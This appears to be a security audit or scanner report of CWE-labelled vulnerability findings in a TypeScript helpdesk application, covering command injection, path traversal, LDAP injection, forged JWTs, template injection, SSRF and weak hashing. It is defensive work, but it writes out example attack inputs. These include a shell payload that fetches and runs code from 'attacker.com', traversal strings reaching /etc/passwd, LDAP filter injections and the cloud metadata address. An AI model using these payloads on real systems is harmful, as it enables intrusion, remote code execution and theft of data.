extra.message: The user-supplied exportFormat query parameter (import-export.controller.ts:166) is interpolated directly into a shell command string (`pandoc ${sourcePath} -o ${outputPath}`) that is executed via spawn('bash', ['-c', cmd], { shell: true }). An attacker can supply a value such as `pdf; curl attacker.com/x | sh` to execute arbitrary OS commands on the server.

cwe: CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')

extra.message: The report template path is built by joining templatesDir with the ticket's category, which is fully attacker-controlled at ticket creation (CreateTicketDto.category is an unrestricted string). A category such as `../../../../../../etc/passwd` escapes the templates directory and fs.readFileSync returns an arbitrary file. Unlike renderQueueReport (line 65), no startsWith containment check is performed.

cwe: CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')

extra.message: saveBrandingAsset joins the branding directory with the client-supplied multipart filename (file.originalname) with no sanitization or path containment check, then writes the uploaded buffer there. A filename like `../../../../public/evil.js` writes an attacker-controlled file anywhere the process can write. There is also no MIME/type validation, unlike saveWorkspaceIconAsset which generates a UUID name and validates the MIME type.

cwe: CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')

extra.message: findStaffRecordByEmail builds an LDAP search filter by concatenating the raw email query parameter: `(mail=${email})`. No escaping is applied, so an attacker can inject filter metacharacters (e.g. `*)(objectClass=*` or `admin@x.com)(|(mail=*`) to alter the search and enumerate/disclose directory records. The other directory methods correctly call escapeLdapFilterValue, but this one does not.

cwe: CWE-90: Improper Neutralization of Special Elements used in an LDAP Query ('LDAP Injection')

extra.message: Authorization is decided from the caller-supplied membershipTier query parameter (escalations.controller.ts:115). Any authenticated user, including a customer_user from an unrelated organization, can request GET /escalations/:id?membershipTier=partner_reviewer and the method returns the full escalation with cross-organization ticket/requester/assignee data before the organization check at line 319 is ever reached.

cwe: CWE-639: Authorization Bypass Through User-Controlled Key

extra.message: admitPartnerHandoff verifies the handoff token with algorithms ['HS256','none'] and, on any verification failure, falls back to jwt.decode() which performs no signature verification at all. The secret also defaults to an empty string. An attacker can forge an unsigned/`alg:none` token (or any invalid token) carrying attacker-controlled reviewerEmail/accessLevel, which the service then trusts and records.

cwe: CWE-347: Improper Verification of Cryptographic Signature

extra.message: previewCategoryDigestIntro compiles an attacker-supplied Handlebars template (introTemplate from the digest-intro-preview request body) with Handlebars.compile and then executes it. Handlebars templates can call helpers and access the prototype chain, enabling server-side template injection and potentially remote code execution. The sibling previewArticleFeedbackFooter correctly uses a hardcoded template.

cwe: CWE-94: Improper Control of Generation of Code ('Code Injection')

extra.message: forgotPassword returns the generated password-reset token directly in the HTTP response body. Anyone can request a reset for any victim email, read the token from the JSON response, and call /auth/reset-password to take over the account. The token must only be delivered out-of-band (email), never in the response.

cwe: CWE-200: Exposure of Sensitive Information to an Unauthorized Actor

extra.message: initializeAccount lets the unauthenticated caller control the bcrypt cost factor through the provisioningTier field (InitializeAccountDto has only @IsInt, no minimum). Passing provisioningTier=1 (or 0) produces an extremely weak password hash, making offline cracking of the newly provisioned credentials trivial.

cwe: CWE-916: Use of Password Hash With Insufficient Computational Effort

extra.message: The JWT signing secret falls back to the hardcoded literal 'change-me-in-production-use-a-real-secret-key' when JWT_SECRET is unset. If deployed without the environment variable, anyone who knows this public default can forge valid JWTs for any user/role and fully bypass authentication.

JwtStrategy uses the same hardcoded fallback secret 'change-me-in-production-use-a-real-secret-key' for token verification. Because the default is publicly known, tokens can be forged when JWT_SECRET is not configured, granting authentication as any user.

exportTicketsBundle places the caller-supplied reportLabel directly into the Content-Disposition response header without sanitization. Unlike exportEscalationsBundle (line 150) which strips CR/LF, this value is not scrubbed, allowing HTTP response header/response-splitting injection through the download filename.

cwe: CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Response Splitting')

extra.message: receivePartnerSync base64-decodes attacker-controlled JSON, converts it with plainToClass (which copies undeclared extra properties) and passes the resulting object straight into prisma.ticket.update as `data: fields as any`. A caller can therefore overwrite arbitrary ticket columns such as organizationId, requesterId, ticketNumber, slaDeadline and status, bypassing the normal update/status-transition logic. Only ticketId is stripped.

cwe: CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes

extra.message: applyLegacyPartnerBundle decrypts the partner bundle with AES-256-CBC and no authentication tag or MAC, then JSON.parses the plaintext and mass-assigns it into the ticket. The ciphertext is unauthenticated, so it can be tampered with (padding-oracle style modification) and the resulting object controls arbitrary ticket fields. The newer importSecurePartnerBundle correctly uses AES-256-GCM with an auth tag.

cwe: CWE-353: Missing Support for Integrity Check

extra.message: The KB search query is written to the application log without stripping CR/LF/control characters. An attacker can embed newlines in the search term to forge additional log entries or corrupt the log stream. The equivalent search logging in tickets.service.ts (line 265) sanitizes the value before logging, confirming this is an oversight.

cwe: CWE-117: Improper Output Neutralization for Logs

extra.message: findById always includes the ticket's internalNotes (and escalations) in the response. checkTicketAccess only verifies the ticket belongs to the customer's organization, so a customer_user can retrieve private staff-only internal notes that are otherwise guarded by the staff-only GET /tickets/:id/internal-notes route. getTicketTimeline (line 948) leaks them the same way.

The portal_session cookie is set without httpOnly, secure or sameSite options, and its value is a signed portal JWT. A missing httpOnly flag lets any injected script read the session token, and missing Secure allows it to be transmitted over plaintext HTTP. The workspace_context cookie just below correctly sets these flags.

relayToPartnerEndpoint performs a server-side fetch to the webhook.url stored on the record with no allowlist or SSRF protections, so a webhook can be pointed at internal services (e.g. http://169.254.169.254/, http://localhost:3000/) to reach internal-only endpoints. It also appends the secret PARTNER_DELIVERY_KEY as a query-string parameter, exposing the credential to the target and to logs.
